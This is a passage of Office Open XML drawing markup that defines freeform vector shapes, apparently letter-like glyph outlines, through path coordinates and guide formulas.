                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="17" y="200"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="19" y="192"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="21" y="177"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="21" y="37"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="21" y="37"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="19" y="23"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="17" y="16"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13" y="12"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11" y="12"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="10"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="4"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="54" y="0"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="54" y="22"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="62" y="128"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="62" y="128"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="66" y="134"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="72" y="140"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="79" y="144"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="87" y="146"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="87" y="146"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="95" y="144"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="101" y="142"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="107" y="136"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="112" y="128"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="116" y="119"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="118" y="107"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="120" y="93"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="120" y="76"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="120" y="76"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="118" y="47"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="116" y="35"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="112" y="25"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="108" y="18"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="103" y="12"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="97" y="10"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="91" y="8"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="91" y="8"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="81" y="10"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="75" y="14"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="68" y="20"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="64" y="27"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="58" y="37"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="56" y="51"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="54" y="64"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="54" y="80"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="54" y="80"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="56" y="107"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="58" y="119"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="62" y="128"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="62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4" name="Freeform 75">
              <a:extLst>
                <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                  <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{71C6728E-82CB-41E1-A74C-253D820763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35012" y="4770827"/>
              <a:ext cx="74214" cy="98333"/>
            </a:xfrm>
            <a:custGeom>
              <a:avLst/>
              <a:gdLst>
                <a:gd name="T0" fmla="*/ 55 w 160"/>
                <a:gd name="T1" fmla="*/ 22 h 212"/>
                <a:gd name="T2" fmla="*/ 74 w 160"/>
                <a:gd name="T3" fmla="*/ 4 h 212"/>
                <a:gd name="T4" fmla="*/ 99 w 160"/>
                <a:gd name="T5" fmla="*/ 0 h 212"/>
                <a:gd name="T6" fmla="*/ 113 w 160"/>
                <a:gd name="T7" fmla="*/ 0 h 212"/>
                <a:gd name="T8" fmla="*/ 134 w 160"/>
                <a:gd name="T9" fmla="*/ 10 h 212"/>
                <a:gd name="T10" fmla="*/ 150 w 160"/>
                <a:gd name="T11" fmla="*/ 29 h 212"/>
                <a:gd name="T12" fmla="*/ 158 w 160"/>
                <a:gd name="T13" fmla="*/ 56 h 212"/>
                <a:gd name="T14" fmla="*/ 160 w 160"/>
                <a:gd name="T15" fmla="*/ 72 h 212"/>
                <a:gd name="T16" fmla="*/ 154 w 160"/>
                <a:gd name="T17" fmla="*/ 107 h 212"/>
                <a:gd name="T18" fmla="*/ 142 w 160"/>
                <a:gd name="T19" fmla="*/ 132 h 212"/>
                <a:gd name="T20" fmla="*/ 132 w 160"/>
                <a:gd name="T21" fmla="*/ 142 h 212"/>
                <a:gd name="T22" fmla="*/ 107 w 160"/>
                <a:gd name="T23" fmla="*/ 152 h 212"/>
                <a:gd name="T24" fmla="*/ 94 w 160"/>
                <a:gd name="T25" fmla="*/ 153 h 212"/>
                <a:gd name="T26" fmla="*/ 74 w 160"/>
                <a:gd name="T27" fmla="*/ 150 h 212"/>
                <a:gd name="T28" fmla="*/ 55 w 160"/>
                <a:gd name="T29" fmla="*/ 138 h 212"/>
                <a:gd name="T30" fmla="*/ 55 w 160"/>
                <a:gd name="T31" fmla="*/ 177 h 212"/>
                <a:gd name="T32" fmla="*/ 57 w 160"/>
                <a:gd name="T33" fmla="*/ 196 h 212"/>
                <a:gd name="T34" fmla="*/ 63 w 160"/>
                <a:gd name="T35" fmla="*/ 202 h 212"/>
                <a:gd name="T36" fmla="*/ 78 w 160"/>
                <a:gd name="T37" fmla="*/ 204 h 212"/>
                <a:gd name="T38" fmla="*/ 0 w 160"/>
                <a:gd name="T39" fmla="*/ 212 h 212"/>
                <a:gd name="T40" fmla="*/ 0 w 160"/>
                <a:gd name="T41" fmla="*/ 204 h 212"/>
                <a:gd name="T42" fmla="*/ 16 w 160"/>
                <a:gd name="T43" fmla="*/ 202 h 212"/>
                <a:gd name="T44" fmla="*/ 22 w 160"/>
                <a:gd name="T45" fmla="*/ 192 h 212"/>
                <a:gd name="T46" fmla="*/ 22 w 160"/>
                <a:gd name="T47" fmla="*/ 37 h 212"/>
                <a:gd name="T48" fmla="*/ 20 w 160"/>
                <a:gd name="T49" fmla="*/ 23 h 212"/>
                <a:gd name="T50" fmla="*/ 16 w 160"/>
                <a:gd name="T51" fmla="*/ 12 h 212"/>
                <a:gd name="T52" fmla="*/ 0 w 160"/>
                <a:gd name="T53" fmla="*/ 10 h 212"/>
                <a:gd name="T54" fmla="*/ 55 w 160"/>
                <a:gd name="T55" fmla="*/ 0 h 212"/>
                <a:gd name="T56" fmla="*/ 63 w 160"/>
                <a:gd name="T57" fmla="*/ 128 h 212"/>
                <a:gd name="T58" fmla="*/ 66 w 160"/>
                <a:gd name="T59" fmla="*/ 134 h 212"/>
                <a:gd name="T60" fmla="*/ 80 w 160"/>
                <a:gd name="T61" fmla="*/ 144 h 212"/>
                <a:gd name="T62" fmla="*/ 88 w 160"/>
                <a:gd name="T63" fmla="*/ 146 h 212"/>
                <a:gd name="T64" fmla="*/ 103 w 160"/>
                <a:gd name="T65" fmla="*/ 142 h 212"/>
                <a:gd name="T66" fmla="*/ 113 w 160"/>
                <a:gd name="T67" fmla="*/ 128 h 212"/>
                <a:gd name="T68" fmla="*/ 119 w 160"/>
                <a:gd name="T69" fmla="*/ 107 h 212"/>
                <a:gd name="T70" fmla="*/ 121 w 160"/>
                <a:gd name="T71" fmla="*/ 76 h 212"/>
                <a:gd name="T72" fmla="*/ 119 w 160"/>
                <a:gd name="T73" fmla="*/ 47 h 212"/>
                <a:gd name="T74" fmla="*/ 113 w 160"/>
                <a:gd name="T75" fmla="*/ 25 h 212"/>
                <a:gd name="T76" fmla="*/ 103 w 160"/>
                <a:gd name="T77" fmla="*/ 12 h 212"/>
                <a:gd name="T78" fmla="*/ 92 w 160"/>
                <a:gd name="T79" fmla="*/ 8 h 212"/>
                <a:gd name="T80" fmla="*/ 82 w 160"/>
                <a:gd name="T81" fmla="*/ 10 h 212"/>
                <a:gd name="T82" fmla="*/ 68 w 160"/>
                <a:gd name="T83" fmla="*/ 20 h 212"/>
                <a:gd name="T84" fmla="*/ 61 w 160"/>
                <a:gd name="T85" fmla="*/ 37 h 212"/>
                <a:gd name="T86" fmla="*/ 55 w 160"/>
                <a:gd name="T87" fmla="*/ 64 h 212"/>
                <a:gd name="T88" fmla="*/ 55 w 160"/>
                <a:gd name="T89" fmla="*/ 80 h 212"/>
                <a:gd name="T90" fmla="*/ 59 w 160"/>
                <a:gd name="T91" fmla="*/ 119 h 212"/>
                <a:gd name="T92" fmla="*/ 63 w 160"/>
                <a:gd name="T93" fmla="*/ 128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0" h="212">
                  <a:moveTo>
                    <a:pt x="55" y="22"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="55" y="22"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="64" y="12"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="74" y="4"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="86" y="0"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="99" y="0"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="99" y="0"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="113" y="0"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="125" y="4"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="134" y="10"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="144" y="18"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="150" y="29"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="156" y="41"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="158" y="56"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="160" y="72"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="160" y="72"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="158" y="91"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="154" y="107"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="148" y="120"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="142" y="132"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="142" y="132"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="132" y="142"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="121" y="148"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="107" y="152"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="94" y="153"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="94" y="153"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="84" y="152"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="74" y="150"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="64" y="146"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="55" y="138"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="55" y="177"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="55" y="177"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="57" y="192"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="57" y="196"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="59" y="200"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="63" y="202"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="66" y="204"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="78" y="204"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="78" y="212"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="212"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="204"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="204"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12" y="204"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="16" y="202"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="18" y="200"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="22" y="192"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="22" y="177"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="22" y="37"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="22" y="37"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="20" y="23"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="18" y="16"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="16" y="12"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12" y="12"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="10"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="4"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="55" y="0"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="55" y="22"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="63" y="128"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="63" y="128"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="66" y="134"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="72" y="140"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="80" y="144"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="88" y="146"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="88" y="146"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="95" y="144"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="103" y="142"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="109" y="136"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="113" y="128"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="117" y="119"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="119" y="107"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="121" y="93"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="121" y="76"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="121" y="76"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="119" y="47"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="117" y="35"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="113" y="25"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="109" y="18"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="103" y="12"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="97" y="10"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="92" y="8"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="92" y="8"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="82" y="10"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="76" y="14"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="68" y="20"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="64" y="27"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="61" y="37"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="57" y="51"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="55" y="64"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="55" y="80"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="55" y="80"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="57" y="107"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="59" y="119"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="63" y="128"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="63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5" name="Freeform 76">
              <a:extLst>
                <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                  <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{022C9CC4-A11D-42E8-A12E-3AF5BF915D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0822" y="4750882"/>
              <a:ext cx="41281" cy="90912"/>
            </a:xfrm>
            <a:custGeom>
              <a:avLst/>
              <a:gdLst>
                <a:gd name="T0" fmla="*/ 48 w 89"/>
                <a:gd name="T1" fmla="*/ 148 h 196"/>
                <a:gd name="T2" fmla="*/ 48 w 89"/>
                <a:gd name="T3" fmla="*/ 148 h 196"/>
                <a:gd name="T4" fmla="*/ 50 w 89"/>
                <a:gd name="T5" fmla="*/ 163 h 196"/>
                <a:gd name="T6" fmla="*/ 52 w 89"/>
                <a:gd name="T7" fmla="*/ 173 h 196"/>
                <a:gd name="T8" fmla="*/ 52 w 89"/>
                <a:gd name="T9" fmla="*/ 173 h 196"/>
                <a:gd name="T10" fmla="*/ 54 w 89"/>
                <a:gd name="T11" fmla="*/ 179 h 196"/>
                <a:gd name="T12" fmla="*/ 58 w 89"/>
                <a:gd name="T13" fmla="*/ 181 h 196"/>
                <a:gd name="T14" fmla="*/ 62 w 89"/>
                <a:gd name="T15" fmla="*/ 183 h 196"/>
                <a:gd name="T16" fmla="*/ 66 w 89"/>
                <a:gd name="T17" fmla="*/ 185 h 196"/>
                <a:gd name="T18" fmla="*/ 66 w 89"/>
                <a:gd name="T19" fmla="*/ 185 h 196"/>
                <a:gd name="T20" fmla="*/ 75 w 89"/>
                <a:gd name="T21" fmla="*/ 183 h 196"/>
                <a:gd name="T22" fmla="*/ 85 w 89"/>
                <a:gd name="T23" fmla="*/ 175 h 196"/>
                <a:gd name="T24" fmla="*/ 89 w 89"/>
                <a:gd name="T25" fmla="*/ 183 h 196"/>
                <a:gd name="T26" fmla="*/ 89 w 89"/>
                <a:gd name="T27" fmla="*/ 183 h 196"/>
                <a:gd name="T28" fmla="*/ 79 w 89"/>
                <a:gd name="T29" fmla="*/ 189 h 196"/>
                <a:gd name="T30" fmla="*/ 72 w 89"/>
                <a:gd name="T31" fmla="*/ 193 h 196"/>
                <a:gd name="T32" fmla="*/ 62 w 89"/>
                <a:gd name="T33" fmla="*/ 196 h 196"/>
                <a:gd name="T34" fmla="*/ 50 w 89"/>
                <a:gd name="T35" fmla="*/ 196 h 196"/>
                <a:gd name="T36" fmla="*/ 50 w 89"/>
                <a:gd name="T37" fmla="*/ 196 h 196"/>
                <a:gd name="T38" fmla="*/ 41 w 89"/>
                <a:gd name="T39" fmla="*/ 195 h 196"/>
                <a:gd name="T40" fmla="*/ 31 w 89"/>
                <a:gd name="T41" fmla="*/ 193 h 196"/>
                <a:gd name="T42" fmla="*/ 25 w 89"/>
                <a:gd name="T43" fmla="*/ 187 h 196"/>
                <a:gd name="T44" fmla="*/ 19 w 89"/>
                <a:gd name="T45" fmla="*/ 181 h 196"/>
                <a:gd name="T46" fmla="*/ 19 w 89"/>
                <a:gd name="T47" fmla="*/ 181 h 196"/>
                <a:gd name="T48" fmla="*/ 17 w 89"/>
                <a:gd name="T49" fmla="*/ 175 h 196"/>
                <a:gd name="T50" fmla="*/ 15 w 89"/>
                <a:gd name="T51" fmla="*/ 169 h 196"/>
                <a:gd name="T52" fmla="*/ 15 w 89"/>
                <a:gd name="T53" fmla="*/ 142 h 196"/>
                <a:gd name="T54" fmla="*/ 15 w 89"/>
                <a:gd name="T55" fmla="*/ 55 h 196"/>
                <a:gd name="T56" fmla="*/ 0 w 89"/>
                <a:gd name="T57" fmla="*/ 55 h 196"/>
                <a:gd name="T58" fmla="*/ 0 w 89"/>
                <a:gd name="T59" fmla="*/ 47 h 196"/>
                <a:gd name="T60" fmla="*/ 0 w 89"/>
                <a:gd name="T61" fmla="*/ 47 h 196"/>
                <a:gd name="T62" fmla="*/ 8 w 89"/>
                <a:gd name="T63" fmla="*/ 45 h 196"/>
                <a:gd name="T64" fmla="*/ 15 w 89"/>
                <a:gd name="T65" fmla="*/ 43 h 196"/>
                <a:gd name="T66" fmla="*/ 21 w 89"/>
                <a:gd name="T67" fmla="*/ 39 h 196"/>
                <a:gd name="T68" fmla="*/ 25 w 89"/>
                <a:gd name="T69" fmla="*/ 32 h 196"/>
                <a:gd name="T70" fmla="*/ 25 w 89"/>
                <a:gd name="T71" fmla="*/ 32 h 196"/>
                <a:gd name="T72" fmla="*/ 31 w 89"/>
                <a:gd name="T73" fmla="*/ 20 h 196"/>
                <a:gd name="T74" fmla="*/ 37 w 89"/>
                <a:gd name="T75" fmla="*/ 2 h 196"/>
                <a:gd name="T76" fmla="*/ 50 w 89"/>
                <a:gd name="T77" fmla="*/ 0 h 196"/>
                <a:gd name="T78" fmla="*/ 50 w 89"/>
                <a:gd name="T79" fmla="*/ 0 h 196"/>
                <a:gd name="T80" fmla="*/ 48 w 89"/>
                <a:gd name="T81" fmla="*/ 47 h 196"/>
                <a:gd name="T82" fmla="*/ 83 w 89"/>
                <a:gd name="T83" fmla="*/ 47 h 196"/>
                <a:gd name="T84" fmla="*/ 83 w 89"/>
                <a:gd name="T85" fmla="*/ 55 h 196"/>
                <a:gd name="T86" fmla="*/ 48 w 89"/>
                <a:gd name="T87" fmla="*/ 55 h 196"/>
                <a:gd name="T88" fmla="*/ 48 w 89"/>
                <a:gd name="T89" fmla="*/ 148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9" h="196">
                  <a:moveTo>
                    <a:pt x="48" y="148"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="48" y="148"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="50" y="163"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="52" y="173"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="52" y="173"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="54" y="179"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="58" y="181"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="62" y="183"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="66" y="185"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="66" y="185"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="75" y="183"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="85" y="175"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="89" y="183"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="89" y="183"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="79" y="189"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="72" y="193"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="62" y="196"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="50" y="196"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="50" y="196"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="41" y="195"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="31" y="193"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="25" y="187"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="19" y="181"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="19" y="181"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="17" y="175"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15" y="169"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15" y="142"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15" y="55"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="55"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="47"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="47"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8" y="45"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15" y="43"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="21" y="39"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="25" y="32"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="25" y="32"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="31" y="20"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="37" y="2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48" y="47"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="83" y="47"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="83" y="55"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="48" y="55"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="48" y="1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6" name="Freeform 77">
              <a:extLst>
                <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                  <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{736BB627-C23D-4B49-AEF4-9D0A23676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2771" y="4820457"/>
              <a:ext cx="21800" cy="21337"/>
            </a:xfrm>
            <a:custGeom>
              <a:avLst/>
              <a:gdLst>
                <a:gd name="T0" fmla="*/ 47 w 47"/>
                <a:gd name="T1" fmla="*/ 23 h 46"/>
                <a:gd name="T2" fmla="*/ 47 w 47"/>
                <a:gd name="T3" fmla="*/ 23 h 46"/>
                <a:gd name="T4" fmla="*/ 45 w 47"/>
                <a:gd name="T5" fmla="*/ 33 h 46"/>
                <a:gd name="T6" fmla="*/ 39 w 47"/>
                <a:gd name="T7" fmla="*/ 41 h 46"/>
                <a:gd name="T8" fmla="*/ 33 w 47"/>
                <a:gd name="T9" fmla="*/ 45 h 46"/>
                <a:gd name="T10" fmla="*/ 24 w 47"/>
                <a:gd name="T11" fmla="*/ 46 h 46"/>
                <a:gd name="T12" fmla="*/ 24 w 47"/>
                <a:gd name="T13" fmla="*/ 46 h 46"/>
                <a:gd name="T14" fmla="*/ 14 w 47"/>
                <a:gd name="T15" fmla="*/ 45 h 46"/>
                <a:gd name="T16" fmla="*/ 6 w 47"/>
                <a:gd name="T17" fmla="*/ 41 h 46"/>
                <a:gd name="T18" fmla="*/ 2 w 47"/>
                <a:gd name="T19" fmla="*/ 33 h 46"/>
                <a:gd name="T20" fmla="*/ 0 w 47"/>
                <a:gd name="T21" fmla="*/ 23 h 46"/>
                <a:gd name="T22" fmla="*/ 0 w 47"/>
                <a:gd name="T23" fmla="*/ 23 h 46"/>
                <a:gd name="T24" fmla="*/ 2 w 47"/>
                <a:gd name="T25" fmla="*/ 13 h 46"/>
                <a:gd name="T26" fmla="*/ 6 w 47"/>
                <a:gd name="T27" fmla="*/ 6 h 46"/>
                <a:gd name="T28" fmla="*/ 14 w 47"/>
                <a:gd name="T29" fmla="*/ 2 h 46"/>
                <a:gd name="T30" fmla="*/ 24 w 47"/>
                <a:gd name="T31" fmla="*/ 0 h 46"/>
                <a:gd name="T32" fmla="*/ 24 w 47"/>
                <a:gd name="T33" fmla="*/ 0 h 46"/>
                <a:gd name="T34" fmla="*/ 33 w 47"/>
                <a:gd name="T35" fmla="*/ 2 h 46"/>
                <a:gd name="T36" fmla="*/ 41 w 47"/>
                <a:gd name="T37" fmla="*/ 6 h 46"/>
                <a:gd name="T38" fmla="*/ 45 w 47"/>
                <a:gd name="T39" fmla="*/ 13 h 46"/>
                <a:gd name="T40" fmla="*/ 47 w 47"/>
                <a:gd name="T41" fmla="*/ 23 h 46"/>
                <a:gd name="T42" fmla="*/ 47 w 47"/>
                <a:gd name="T43" fmla="*/ 2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7" h="46">
                  <a:moveTo>
                    <a:pt x="47" y="23"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="47" y="23"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="45" y="33"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="39" y="41"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="33" y="45"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="24" y="46"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="24" y="46"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14" y="45"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6" y="41"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2" y="33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2" y="13"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6" y="6"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14" y="2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33" y="2"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="41" y="6"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="45" y="13"/>
                  </a:lnTo>
